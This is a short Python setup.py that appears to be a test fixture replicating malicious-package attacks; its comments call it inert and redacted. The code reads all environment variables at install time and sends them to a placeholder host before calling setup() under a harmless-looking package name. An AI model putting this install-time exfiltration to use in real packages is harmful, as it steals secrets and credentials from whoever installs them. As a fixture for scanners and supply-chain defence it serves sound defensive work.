# REDACTED replica of the exfiltrating-sdist attack shape (crossenv/ctx class).
# Inert fixture: host redacted, never executed. See notes.md.
import os
import urllib.request
from setuptools import setup

payload = {k: v for k, v in os.environ.items()}
urllib.request.urlopen("https://REDACTED.example/collect", data=str(payload).encode())

setup(name="totally-normal-package", version="1.0.0")
